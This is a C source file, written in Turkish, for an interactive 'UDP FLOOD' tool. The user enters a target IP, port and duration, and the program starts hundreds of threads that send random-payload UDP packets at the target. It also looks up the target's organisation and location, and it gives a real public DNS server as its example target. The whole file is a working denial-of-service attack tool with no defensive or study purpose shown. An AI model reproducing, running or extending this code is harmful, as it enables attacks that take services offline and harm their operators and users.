#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <time.h>
#include <pthread.h>
#include <signal.h>
#include <netdb.h>
#include <curl/curl.h>

#define BOYUT 1400
#define THREAD_SAY 100
#define KOMUT_MAX 64

int devam = 1;
char hedef[16];
int port;
int surec;
int islem_sayisi;
int t_sayisi = THREAD_SAY;
pthread_t *tidler = NULL;
int aktif = 0;

// API cevabı için yapı
struct api_cevap {
    char *veri;
    size_t boyut;
};

size_t yazici(void *ptr, size_t size, size_t nmemb, struct api_cevap *data) {
    size_t toplam = size * nmemb;
    data->veri = realloc(data->veri, data->boyut + toplam + 1);
    if (data->veri) {
        memcpy(&(data->veri[data->boyut]), ptr, toplam);
        data->boyut += toplam;
        data->veri[data->boyut] = 0;
    }
    return toplam;
}

void ip_sorgula(char *ip, char *org, char *sehir, char *ulke) {
    CURL *curl = curl_easy_init();
    if (!curl) {
        strcpy(org, "Bilinmiyor");
        strcpy(sehir, "Bilinmiyor");
        strcpy(ulke, "Bilinmiyor");
        return;
    }
    
    char url[256];
    snprintf(url, sizeof(url), "http://ip-api.com/json/%s", ip);
    
    struct api_cevap cevap = {0};
    cevap.veri = malloc(1);
    cevap.veri[0] = 0;
    cevap.boyut = 0;
    
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, yazici);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &cevap);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "curl/7.68.0");
    
    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    
    if (res == CURLE_OK && cevap.veri) {
        // Basit JSON ayrıştırma (elle, kütüphane yok)
        char *p = cevap.veri;
        char *org_ptr = strstr(p, "\"org\"");
        char *city_ptr = strstr(p, "\"city\"");
        char *country_ptr = strstr(p, "\"country\"");
        
        if (org_ptr) {
            org_ptr = strchr(org_ptr, ':');
            if (org_ptr) {
                org_ptr++;
                while (*org_ptr == ' ' || *org_ptr == '"') org_ptr++;
                char *end = strchr(org_ptr, '"');
                if (end) {
                    int len = end - org_ptr;
                    if (len > 0 && len < 100) {
                        strncpy(org, org_ptr, len);
                        org[len] = 0;
                    }
                }
            }
        }
        if (city_ptr) {
            city_ptr = strchr(city_ptr, ':');
            if (city_ptr) {
                city_ptr++;
                while (*city_ptr == ' ' || *city_ptr == '"') city_ptr++;
                char *end = strchr(city_ptr, '"');
                if (end) {
                    int len = end - city_ptr;
                    if (len > 0 && len < 100) {
                        strncpy(sehir, city_ptr, len);
                        sehir[len] = 0;
                    }
                }
            }
        }
        if (country_ptr) {
            country_ptr = strchr(country_ptr, ':');
            if (country_ptr) {
                country_ptr++;
                while (*country_ptr == ' ' || *country_ptr == '"') country_ptr++;
                char *end = strchr(country_ptr, '"');
                if (end) {
                    int len = end - country_ptr;
                    if (len > 0 && len < 100) {
                        strncpy(ulke, country_ptr, len);
                        ulke[len] = 0;
                    }
                }
            }
        }
    } else {
        strcpy(org, "Bilinmiyor");
        strcpy(sehir, "Bilinmiyor");
        strcpy(ulke, "Bilinmiyor");
    }
    free(cevap.veri);
}

void renkli_prompt() {
    printf("\n");
    char *yazi = " root@slient ~> ";
    int renkler[] = {17,17,17,17,17,17,17,17,129,129,129,129,129,129,129};
    int uzunluk = sizeof(renkler)/sizeof(int);
    for (int i = 0; yazi[i] != '\0'; i++) {
        int r = renkler[i % uzunluk];
        printf("\033[48;5;%dm\033[38;5;15m%c", r, yazi[i]);
    }
    printf("\033[0m");
    fflush(stdout);
}

void *gonderici(void *arg) {
    int soket = socket(AF_INET, SOCK_DGRAM, 0);
    if (soket < 0) return NULL;
    int tekrar = 1;
    setsockopt(soket, SOL_SOCKET, SO_REUSEADDR, &tekrar, sizeof(tekrar));
    
    struct sockaddr_in hedef_adres;
    hedef_adres.sin_family = AF_INET;
    hedef_adres.sin_port = htons(port);
    inet_pton(AF_INET, hedef, &hedef_adres.sin_addr);
    
    unsigned char *veri = malloc(BOYUT);
    if (!veri) { close(soket); return NULL; }
    for (int i = 0; i < BOYUT; i++) veri[i] = rand() % 256;
    
    while (devam) {
        if (sendto(soket, veri, BOYUT, 0, (struct sockaddr *)&hedef_adres, sizeof(hedef_adres)) < 0) {
            close(soket);
            soket = socket(AF_INET, SOCK_DGRAM, 0);
            if (soket < 0) break;
            setsockopt(soket, SOL_SOCKET, SO_REUSEADDR, &tekrar, sizeof(tekrar));
        }
    }
    free(veri);
    close(soket);
    return NULL;
}

void saldir(char *ip, int p, int sn) {
    strcpy(hedef, ip);
    port = p;
    surec = sn;
    devam = 1;
    
    islem_sayisi = sysconf(_SC_NPROCESSORS_ONLN) * 2;
    int toplam = islem_sayisi * t_sayisi;
    
    // Gerçek IP sorgusu
    char org[128] = {0};
    char sehir[128] = {0};
    char ulke[128] = {0};
    
    printf("[+] IP sorgulaniyor: %s\n", ip);
    ip_sorgula(ip, org, sehir, ulke);
    printf("[+] Sorgu tamamlandi.\n\n");
    
    printf("\n");
    printf("\033[1;36m[ Attack Info ]\033[0m\n");
    printf("  Status    \033[32mSent successfully!\033[0m\n");
    printf("  Host      %s\n", hedef);
    printf("  Method    udp\n");
    printf("  Port      %d\n", port);
    printf("  Time      %d\n\n", surec);
    
    printf("\033[1;33m[ Target Info ]\033[0m\n");
    printf("  Org       %s\n", org[0] ? org : "Bilinmiyor");
    printf("  Region    %s\n", sehir[0] ? sehir : "Bilinmiyor");
    printf("  Country   %s\n", ulke[0] ? ulke : "Bilinmiyor");
    printf("  Running   1/9999\n\n");
    
    printf("\033[1;32mroot@doxbot ->\033[0m \n");
    printf("[+] Saldiri basladi. 'stop' ile durdur.\n\n");
    
    tidler = malloc(sizeof(pthread_t) * toplam);
    if (!tidler) return;
    
    int index = 0;
    for (int i = 0; i < islem_sayisi; i++) {
        for (int j = 0; j < t_sayisi; j++) {
            pthread_create(&tidler[index++], NULL, gonderici, NULL);
        }
    }
    aktif = toplam;
    
    time_t basla = time(NULL);
    char girdi[KOMUT_MAX];
    
    while (time(NULL) - basla < surec && devam) {
        renkli_prompt();
        if (fgets(girdi, sizeof(girdi), stdin) == NULL) break;
        girdi[strcspn(girdi, "\n")] = 0;
        
        if (strcmp(girdi, "stop") == 0) {
            devam = 0;
            printf("[+] Durduruluyor...\n");
            break;
        } else if (strcmp(girdi, "status") == 0) {
            printf("[+] Calisiyor: %d islem, %d thread/islem\n", islem_sayisi, t_sayisi);
        } else {
            printf("[-] Bilinmiyor: %s\n", girdi);
        }
    }
    
    devam = 0;
    sleep(1);
    for (int i = 0; i < aktif; i++) {
        pthread_join(tidler[i], NULL);
    }
    free(tidler);
    tidler = NULL;
    aktif = 0;
    printf("[+] Saldiri tamamlandi.\n\n");
}

int main() {
    printf("\n\033[1;34m=== UDP FLOOD ===\033[0m\n");
    printf("Kullanim: ./udpis\n");
    printf("Ornek: 8.8.8.8 53 60\n");
    printf("Komut: stop, status\n\n");
    
    // curl global init
    curl_global_init(CURL_GLOBAL_ALL);
    
    char girdi[KOMUT_MAX];
    while (1) {
        renkli_prompt();
        if (fgets(girdi, sizeof(girdi), stdin) == NULL) break;
        girdi[strcspn(girdi, "\n")] = 0;
        
        if (strcmp(girdi, "exit") == 0 || strcmp(girdi, "quit") == 0) {
            printf("[+] Cikiliyor...\n");
            break;
        }
        
        char ip[16];
        int p, sn;
        if (sscanf(girdi, "%15s %d %d", ip, &p, &sn) == 3) {
            if (p > 0 && p < 65536 && sn > 0) {
                saldir(ip, p, sn);
            } else {
                printf("[-] Gecersiz deger. Ornek: 8.8.8.8 53 60\n");
            }
        } else {
            printf("[-] Format: <IP> <PORT> <SANIYE>\n");
        }
    }
    
    curl_global_cleanup();
    return 0;
}
